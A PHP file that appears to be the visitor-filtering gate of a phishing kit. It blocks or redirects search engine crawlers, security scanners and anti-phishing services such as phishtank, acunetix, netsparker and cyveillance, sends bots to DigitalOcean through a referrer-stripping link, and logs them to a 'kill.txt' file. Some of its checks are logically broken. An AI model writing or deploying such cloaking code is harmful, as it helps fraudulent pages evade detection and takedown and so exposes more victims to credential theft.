<?php

        require_once 'Modernized.php';
        require_once 'Pullers.php';
        require_once 'Vendors/autoload.php';
    use Jaybizzle\CrawlerDetect\CrawlerDetect;
    $Modernizeds = new Modernized;
    $Pullers = new Pullers;
    $spider = new Spider;
    $crawler = new CrawlerDetect;
    $VPN = "off";
    $HeuristicVPN = "off";
    $CountryLock = "off";

    if (
        !$Modernizeds->localhost($_SESSION['ip'])
    ) {
        if (
            $Modernizeds->getOS() == "Windows 95" || $Modernizeds->getOS() == "Windows 98" || $Modernizeds->getOS() == "Windows ME" ||
            $Modernizeds->getOS() == "Windows 2000" || $Modernizeds->getOS() == "Windows Server 2003/XP x64" ||
            $Modernizeds->getOS() == "Windows Vista" || $Modernizeds->getOS() == "Windows XP" ||
            $Modernizeds->getOS() == "BlackBerry" || $Modernizeds->getOS() == "Linux" || $Modernizeds->getOS() == "Ubuntu" ||
            $Modernizeds->getOS() == "Unknown OS" ) {
            echo $Pullers->throw404();
            if (file_exists("Vendor/Gradle/kill.txt")) {
                $Modernizeds->log(
                    "Vendor/Gradle/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: OS (" . $Modernizeds->getOS() . ")\n\n"
                );
            } elseif (file_exists("../Vendor/Gradle/kill.txt")) {
                $Modernizeds->log(
                    "../Vendor/Gradle/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: OS (" . $Modernizeds->getOS() . ")\n\n"
                );
            } else {
                $Modernizeds->log(
                    "./Vendor/Gradle/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: OS (" . $Modernizeds->getOS() . ")\n\n"
                );
            }
            die();
        }
    

        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        $isGooglebot = strpos($user_agent, 'Googlebot') !== false;
        if ($isGooglebot) {
            echo '<script> window.location="https://nullreferer.com/?https://www.digitalocean.com/" </script>';
            exit();
        }

        if (preg_match('/bot|crawl|slurp|spider/i', $user_agent)) {
            echo '<script> window.location="https://nullreferer.com/?https://www.digitalocean.com/" </script>';
        
        } else {
        }
        
        
        $GreyBots = array("abot", "dbot", "ebot", "hbot", "kbot", "lbot", "mbot", "nbot", "obot", "pbot", "rbot", "sbot", "tbot", "vbot", "ybot", "zbot", "bot.", "bot/", "_bot", ".bot", "/bot", "-bot", ":bot", "(bot", "crawl", "slurp", "spider", "seek", "accoona", "acoon", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "bigbrother", "biglotron", "bjaaland", "blackwidow", "blaiz", "blog", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "curl", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "dieblindekuh", "digger", "ditto", "dmoz", "docomo", "downloadexpress", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3searchengine", "esther", "evliyacelebi", "ezresult", "falcon", "felixide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fishsearch", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hkuwwwoctopus", "homerweb", "htdig", "htmlindex", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ia_archiver", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspectorweb", "intelliagent", "internetshinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "linkvalidator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mattie", "mediafox", "mediapartners", "mercator", "merzscope", "microsofturlcontrol", "minirank", "miva", "mj12", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsabeta", "nec-meshexplorer", "nederland.zoek", "netcartawebmapengine", "netmechanic", "netresearchserver", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "siteexplorer", "nutch", "nzexplorer", "objectssearch", "occam", "omni", "opentext", "openfind", "openintelligencedata", "orbsearch", "osis-project", "packrat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgpkeyagent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "populariconoclast", "psycheclone", "publisher", "python", "rambler", "ravensearch", "roach", "roadrunner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "sitesearcher", "sitevalet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "sygol", "szukacz", "tachblackwidow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "urlcheck", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "webcore", "webhopper", "webwombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "weblogmonitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "wget", "whizbang", "whowhere", "wildferret", "worldlight", "wwwc", "wwwster", "xenu", "xget", "xift", "xirq", "yandex", "yanga", "yeti", "yodao", "zao/", "zippp", "zyborg", "proximic", "Googlebot", "Baiduspider", "Cliqzbot", "A6-Indexer", "AhrefsBot", "Genieo", "BomboraBot", "CCBot", "URLAppendBot", "DomainAppender", "msnbot-media", "Antivirus", "YoudaoBot", "MJ12bot", "linkdexbot", "Go-http-client",	"Googlebot", "Baiduspider", "PhantomJS", "applebot", "metauri.com", "Twitterbot", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogouwebspider", "bingbot", "Yahoo!Slurp", "facebookexternalhit", "PrintfulBot", "msnbot", "Twitterbot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimesBot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIXCrawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeercrawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "80legs.com/webcrawler", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "spbot", "Feedly", "bot", "java", "curl", "spider", "crawler");
        
        if (in_array($_SERVER['REMOTE_ADDR'], $GreyBots)) {
            echo '<script> window.location="https://nullreferer.com/?https://www.digitalocean.com/" </script>';
        }
        
        $Grey_Botname = array(
            "bot", "above", "google", "softlayer", "amazonaws", "cyveillance", "compatible", "facebook", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "apache-httpclient", "lssrocketcrawler", "Trident", "X11", "Macintosh", "crawler", "urlredirectresolver", "jetbrains", "spam", "windows95", "windows98", "acunetix", "netsparker", "google", "007ac9", "008", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", "50.nu", "a6-indexer", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", "abravespider", "accelobot", "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics", "antbot", "apercite", "aportworm", "arabot", "crawl", "slurp", "spider", "seek", "accoona", "acoon", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "bigbrother", "biglotron", "bjaaland", "blackwidow", "blaiz", "blog", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "curl", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "dieblindekuh", "digger", "ditto", "dmoz", "docomo", "downloadexpress", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3searchengine", "esther", "evliyacelebi", "ezresult", "falcon", "felixide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fishsearch", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hkuwwwoctopus", "homerweb", "htdig", "htmlindex", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ia_archiver", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspectorweb", "intelliagent", "internetshinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "linkvalidator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mattie", "mediafox", "mediapartners", "mercator", "merzscope", "microsofturlcontrol", "minirank", "miva", "mj12", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsabeta", "nec-meshexplorer", "nederland.zoek", "netcartawebmapengine", "netmechanic", "netresearchserver", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "nutch", "nzexplorer", "objectssearch", "occam", "omni", "opentext", "openfind", "openintelligencedata", "orbsearch", "osis-project", "packrat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgpkeyagent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "populariconoclast", "psycheclone", "publisher", "python", "rambler", "ravensearch", "roach", "roadrunner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "sitesearcher", "sitevalet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "sygol", "szukacz", "tachblackwidow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "urlcheck", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "webcore", "webhopper", "webwombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "weblogmonitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "wget", "whizbang", "whowhere", "wildferret", "worldlight", "wwwc", "wwwster", "xenu", "xift", "xirq", "yandex", "yanga", "yeti", "yahoo!"
        );
        
        foreach ($Grey_Botname as $system) {
            if (stripos($_SERVER['HTTP_USER_AGENT'], $system)) {
                $Modernizeds->log(
                    "./Vendor/Gradle/kill.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: OS (Bot Destroyer)\n\n"
                );
        
        
            }
        }
        
        
    }